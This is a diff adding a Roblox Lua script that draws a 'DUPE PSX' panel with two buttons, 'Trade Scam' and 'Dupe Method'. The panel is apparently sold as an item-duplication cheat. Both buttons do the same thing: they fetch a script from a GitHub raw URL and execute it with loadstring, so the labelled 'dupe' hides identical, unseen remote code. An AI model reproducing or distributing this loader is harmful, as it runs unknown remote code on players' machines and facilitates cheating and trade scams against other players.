@@ -1,0 +1,70 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local SCRIPTbyDuperX222 = Instance.new("TextLabel")
+local Bot1 = Instance.new("TextButton")
+local Bot2 = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(129, 129, 129)
+Frame.Position = UDim2.new(0.378792703, 0, 0.177551016, 0)
+Frame.Size = UDim2.new(0, 304, 0, 316)
+Frame.Active = true 
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(91, 91, 91)
+TextLabel.Size = UDim2.new(0, 304, 0, 68)
+TextLabel.Font = Enum.Font.LuckiestGuy
+TextLabel.Text = "DUPE PSX"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 33.000
+TextLabel.TextWrapped = true
+
+SCRIPTbyDuperX222.Name = "SCRIPT by DuperX222\\"
+SCRIPTbyDuperX222.Parent = Frame
+SCRIPTbyDuperX222.BackgroundColor3 = Color3.fromRGB(129, 129, 129)
+SCRIPTbyDuperX222.Position = UDim2.new(0.00328947371, 0, 0.841772139, 0)
+SCRIPTbyDuperX222.Size = UDim2.new(0, 303, 0, 50)
+SCRIPTbyDuperX222.Font = Enum.Font.PermanentMarker
+SCRIPTbyDuperX222.Text = "Script by DUPERx22"
+SCRIPTbyDuperX222.TextColor3 = Color3.fromRGB(0, 0, 0)
+SCRIPTbyDuperX222.TextSize = 29.000
+
+Bot1.Name = "Bot1"
+Bot1.Parent = Frame
+Bot1.BackgroundColor3 = Color3.fromRGB(107, 101, 106)
+Bot1.Position = UDim2.new(0.171052635, 0, 0.610759497, 0)
+Bot1.Size = UDim2.new(0, 200, 0, 50)
+Bot1.Font = Enum.Font.Arcade
+Bot1.Text = "Trade Scam"
+Bot1.TextColor3 = Color3.fromRGB(0, 0, 0)
+Bot1.TextSize = 29.000
+Bot1.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MILKUPpsx/EASTER/main/mainscript"))()
+end)
+
+Bot2.Name = "Bot2"
+Bot2.Parent = Frame
+Bot2.BackgroundColor3 = Color3.fromRGB(107, 101, 106)
+Bot2.Position = UDim2.new(0.171052635, 0, 0.338607579, 0)
+Bot2.Size = UDim2.new(0, 200, 0, 50)
+Bot2.Font = Enum.Font.Arcade
+Bot2.Text = "Dupe Method"
+Bot2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Bot2.TextSize = 26.000
+Bot2.TextWrapped = true
+Bot2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MILKUPpsx/EASTER/main/mainscript"))()
+end)
